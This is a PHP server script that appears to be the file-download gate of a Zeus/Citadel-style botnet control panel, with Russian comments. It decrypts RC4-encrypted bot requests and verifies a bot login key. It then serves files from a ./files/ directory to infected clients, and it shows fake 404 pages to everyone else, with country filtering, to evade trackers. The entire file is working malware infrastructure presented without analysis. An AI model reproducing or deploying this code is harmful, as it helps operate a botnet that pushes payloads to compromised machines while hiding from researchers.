<?php define('__REPORT__', 1);

require_once('system/global.php');
require_once('system/config.php');
require_once('system/gate/lib.php');

function die404($text = ''){
	$sapi_name = php_sapi_name();
	if ($sapi_name == 'cgi' || $sapi_name == 'cgi-fcgi')
		@header('Status: 404 Not Found');
	else
		@header($_SERVER['SERVER_PROTOCOL'] . ' 404 Not Found');
	die($text);
}

if (file_exists('system/gate/gate.plugin.404.php'))
	require 'system/gate/gate.plugin.404.php';

if(@$_SERVER['REQUEST_METHOD'] !== 'POST')
	die(function_exists('e404plugin_display')? e404plugin_display() : die404('Not found'));

/* plugin: 404 */
if (function_exists('e404plugin_display') && !empty($config['allowed_countries_enabled'])){
	# Analize IPv4 & Ban if needed
	if (connectToDb()){
		$realIpv4   = trim((!empty($_GET['ip']) ? $_GET['ip'] : $_SERVER['REMOTE_ADDR']));
		$country    = ipv4toc($realIpv4);
		if (!e404plugin_check($country))
			die();
		}
	}

//Получаем данные.
$data     = @file_get_contents('php://input');
$dataSize = @strlen($data);
if($dataSize < HEADER_SIZE + ITEM_HEADER_SIZE)
	die404();

if ($dataSize < BOTCRYPT_MAX_SIZE) rc4($data, $config['botnet_cryptkey_bin']);
visualDecrypt($data);

//Верефикация. Если совпадает MD5, нет смысла проверять, что-то еще.
if(strcmp(md5(substr($data, HEADER_SIZE), true), substr($data, HEADER_MD5, 16)) !== 0)
	die404();

//Парсим данные (Сжатие данных не поддерживается).
$list = array();
for($i = HEADER_SIZE; $i + ITEM_HEADER_SIZE <= $dataSize;){
	$k = @unpack('L4', @substr($data, $i, ITEM_HEADER_SIZE));
	$list[$k[1]] = @substr($data, $i + ITEM_HEADER_SIZE, $k[3]);
	$i += (ITEM_HEADER_SIZE + $k[3]);
	}
unset($data);

//Основные параметры, которые должны быть всегда.
if(empty($list[SBCID_LOGIN_KEY]) || empty($list[SBCID_REQUEST_FILE]))
	die404();

//Проверяем ключ для входа. Привет Citadel трекерам.
if(strcasecmp(trim($list[SBCID_LOGIN_KEY]), BO_LOGIN_KEY) != 0)
	die404();

$requestfile = trim($list[SBCID_REQUEST_FILE]);

function loadfile($file){
	$filename = './files/'.basename($file);
	if (!is_file($filename))
		die404();

	$len = filesize($filename);

	$file_extension = strtolower(substr(strrchr($filename,"."),1));
		
	header("Cache-Control:");
	header("Cache-Control: public");
	header("Content-Type: application/octet-stream");
	
	if (strstr($_SERVER['HTTP_USER_AGENT'], "MSIE")) {
		$iefilename = preg_replace('/\./', '%2e', $filename, substr_count($filename, '.') - 1);
		header("Content-Disposition: attachment; filename=\"$iefilename\"");
		} else {
		header("Content-Disposition: attachment; filename=\"$filename\"");
		}
	header('Content-Transfer-Encoding: binary');  
	header("Content-Length: ".$len);

	@ob_clean();
	flush();
	@readfile("$filename");
	exit;
	}


loadfile($requestfile);

die404();
